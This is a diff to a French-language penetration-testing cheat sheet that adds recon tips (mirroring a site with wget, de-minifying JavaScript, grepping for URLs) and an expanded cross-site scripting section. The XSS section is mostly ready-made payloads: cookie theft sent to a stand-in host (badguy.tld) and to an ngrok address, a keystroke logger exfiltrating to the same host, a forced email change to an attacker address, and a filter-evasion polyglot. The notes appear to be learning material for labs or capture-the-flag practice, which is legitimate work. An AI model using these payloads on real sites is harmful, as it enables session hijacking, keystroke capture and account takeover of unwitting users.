@@ -88,6 +88,20 @@ Récupérer le code "client" de l'application en suivant tout les liens possible
 wget --recursive $TARGET
 ```
 
+Pour traiter le javascript, une fois qu'on à extrait les fichiers avec `wget`,
+on peut les déminifier avec l'outil [jsbeautifier](https://github.com/beautify-web/js-beautify).
+
+```bash
+pip install jsbeautifier
+js-beautify -r $(find mywebsite.tld -name '*.js')
+```
+
+On peut chercher d'autres infos plus facilement du coup avec du grep.
+
+```bash
+grep -ir 'http[s]*://.*baleen' $(find mywebsite.tld -name '*.css' -or -name '*.js')
+```
+
 Cela permet ensuite de réaliser une recherche par texte dans le code:
 
 * `grep -Pzro '(?s)<!--.*?-->'`: pour récupérer les commentaires ([sources](https://stackoverflow.com/questions/3717772/regex-grep-for-multi-line-search-needed/7167115#7167115))
@@ -117,6 +131,7 @@ curl -i $TARGET
 Le site [wayback machine](https://archive.org/web/) permet, pour de vieilles
 applications, d'accéder à des endpoint qui sont toujours accessibles mais qui ne
 sont plus référencés.
+
 
 ##### Versions
 
@@ -203,6 +218,8 @@ Le port `8000` local sera exposé sur le port `4444` de `tic.sh` et les requette
 seront toutes forwardé. L'option `-N` évite d'ouvrir un shell et le `&` à la fin
 de la ligne permet de jouer cette commande en background et donc de
 redonner la main au shell.
+
+[request.bin](https://requestbin.com/) est cool pour vérifier ce type d'infos.
 
 ## Attaque par dictionnaire
 
@@ -478,22 +495,46 @@ faire executer du code à la volée. (voir les "warnings" de [la doc officielle]
 
 ## Injections javascript
 
-Pour être sure que le payload se joue, il vaut mieux utiliser une iframe:
+Il y à plein de type différents d'xss:
 
+* _reflected_: on peut injecter sur sa page (par les param GET par exemple)
+* _stored_: l'xss est stocké dans la base et est peristante
+* _dom based_: l'xss vient d'un élément qui est injecter depuis la page (chat)
+* _blind_: on ne peux pas vérifier l'execution de l'xss ([voir xsshunter](https://xsshunter.com/))
+
+**TIPS:** ça peut être très pratique d'encoder les données à extraire en base64
+
+Examples de payload:
+
+Pour être sure que le payload se joue, il vaut mieux utiliser une iframe:
 ```html
 <iframe src="javascript:alert('xss')">
 ```
 
-### DOM based XSS
-
-### Reflected XSS
-
-### Stored XSS
-
-Payload classique:
-
+Quand le mot `script` est filtré:
 ```html
-<script>document.write('<img src="https://...ngrok.io?' + document.cookie + '"/>')</script>
+<img src="valid.img" width=0 height=0 onload="alert('xss')"/>
+```
+
+Utilisant fetch
+```html
+<script>fetch('https://badguy.tld/steal?cookie=' + btoa(document.cookie));</script>
+```
+
+Utilisant une image si fetch à été bloqué
+```html
+<script>document.write('<img src="https://...ngrok.io?' + btoa(document.cookie) + '"/>')</script>
+```
+
+Implémentant un keylogger:
+```html
+<script>document.onkeypress = function(e) { fetch('https://badguy.tld/log?key=' + btoa(e.key) );}</script>
+```
+
+Appeler une fonction déjà présente dans le site qui s'executera avec les
+privilèges (cookies/autres) de la victime:
+```html
+<script>user.changeEmail('attacker@badguy.tld');</script>
 ```
 
 Si jamais la cible n'est pas compatible avec [fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) 
@@ -519,6 +560,11 @@ payload avec [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/X
   oReq.send(dataTarget);
   document.write('<img src="http://' + logHost + '?state=done&date=' + Date.now() + '"/>');
 </script>
+```
+
+Pour finir un polyglot cool:
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 ```
 
 ## Reverse shell
